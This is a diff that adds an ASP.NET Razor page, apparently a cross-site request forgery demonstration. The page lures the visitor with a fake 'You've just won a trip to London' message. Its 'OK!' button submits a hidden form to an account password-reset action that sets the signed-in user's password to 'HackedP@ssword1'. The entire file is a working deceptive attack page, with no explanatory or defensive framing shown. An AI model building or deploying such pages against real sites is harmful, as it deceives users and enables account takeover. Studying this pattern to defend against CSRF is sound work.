@@ -1,0 +1,21 @@
+﻿
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Index</title>
+</head>
+<body>
+    <h2>Congratulations! You've just won a trip to London, UK! Click the OK button to claim your prize!</h2>
+    @using (Html.BeginForm("ResetPassword2", "Account", new { Email = User.Identity.Name }, FormMethod.Post))
+    {
+        <input type="hidden" name="NewPassword" value="HackedP@ssword1" />
+        <input type="submit" value="OK!" onclick="alert('You won! Thank you for claiming your prize!')" />
+    }
+</body>
+</html>
